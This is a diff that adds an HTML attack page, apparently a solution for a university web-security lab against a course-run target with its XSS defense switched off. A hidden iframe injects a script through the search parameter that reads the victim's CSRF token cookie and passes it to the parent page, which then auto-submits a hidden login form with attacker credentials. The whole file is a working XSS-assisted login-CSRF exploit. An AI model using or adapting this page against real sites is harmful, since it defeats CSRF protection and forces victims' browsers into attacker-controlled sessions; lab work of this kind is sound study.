@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+                background-color: white;
+            }
+            iframe {
+                display: none;
+            }
+        </style>
+    </head>
+    <body>
+        <!-- Hidden iframe to load the vulnerable page's search functionality -->
+        <iframe id="xssFrame" src="http://cpsc4200.mpese.com/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Evar%20csrfCookie%20%3D%20document.cookie.split('%3B').find(c%20%3D%3E%20c.trim().startsWith('csrf_token%3D'))%3B%20var%20token%20%3D%20csrfCookie%20%3F%20csrfCookie.split('%3D')%5B1%5D%20%3A%20''%3B%20window.parent.postMessage(%7Bcsrf%3A%20token%7D%2C%20'*')%3B%3C%2Fscript%3E" style="display:none;"></iframe>
+        <!-- Our login form that will be submitted with the CSRF token -->
+        <form id="loginForm" action="http://cpsc4200.mpese.com/login?csrfdefense=1&xssdefense=0" method="POST" style="display:none;">
+            <input type="text" name="username" value="attacker">
+            <input type="password" name="password" value="l33th4x">
+            <input type="hidden" name="csrf_token" id="csrfTokenField" value="">
+            <input type="submit" value="Login">
+        </form>
+
+        <script>
+            // Listen for message from iframe containing the CSRF token
+            window.addEventListener('message', function(event) {
+                if (event.data && event.data.csrf) {
+                    // Set the CSRF token in our form
+                    document.getElementById('csrfTokenField').value = event.data.csrf;
+                    // Submit the form with the valid CSRF token
+                    document.getElementById('loginForm').submit();
+                }
+            });
+        </script>
+    </body>
+</html>
